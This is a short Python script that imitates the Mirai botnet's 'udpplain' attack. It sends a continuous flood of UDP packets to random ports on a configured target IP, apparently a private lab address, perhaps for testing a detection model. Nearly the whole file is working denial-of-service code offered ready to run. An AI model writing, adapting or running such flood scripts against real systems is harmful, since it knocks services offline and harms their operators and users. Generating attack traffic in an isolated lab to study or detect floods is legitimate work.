import socket
import random
import time

# === CONFIG ===
TARGET_IP = "192.168.223.152"       # Target IP (AI Model or victim)
PACKET_RATE = 1000                  # Packets per second
PAYLOAD_SIZE = 0                    # Mirai usually sends 0-byte UDP
PORT_RANGE = (1, 65535)             # Random ports like real attacks

# === UDP Socket Setup ===
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

# === Attack Loop ===
print(f"[*] Starting Mirai-udpplain attack on {TARGET_IP}...")

try:
    while True:
        target_port = random.randint(*PORT_RANGE)
        payload = b"" if PAYLOAD_SIZE == 0 else random._urandom(PAYLOAD_SIZE)
        sock.sendto(payload, (TARGET_IP, target_port))
        time.sleep(1 / PACKET_RATE)
except KeyboardInterrupt:
    print("\n[!] Attack stopped by user.")
